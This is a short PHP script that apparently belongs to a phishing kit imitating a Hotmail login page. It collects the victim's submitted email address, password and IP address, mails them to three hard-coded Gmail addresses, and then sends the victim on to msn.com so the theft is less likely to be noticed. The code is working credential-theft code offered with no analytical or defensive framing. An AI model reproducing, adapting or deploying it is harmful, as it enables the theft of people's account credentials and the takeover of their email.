<?

$ip = getenv("REMOTE_ADDR");
$message .= "--------------hotmail.com----------\n";
$message .= "Email: ".$_POST["login"]."\n";
$message .= "Password: ".$_POST["passwd"]."\n";
$message .= "IP: ".$ip."\n";
$message .= "----------Powered By CINCH--------------\n";


$recipient = "olembe001@gmail.com,13good2013@gmail.com,olembe07@gmail.com";
$subject = "hotmail.com RESULT";
$headers = "From: ";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
	 mail("$to", "Webmail ReZulT", $message);
if (mail($recipient,$subject,$message,$headers))
	   {
		   header("Location: http://www.msn.com/");

	   }
else
    	   {
 		echo "ERROR! Please go back and try again.";
  	   }

?>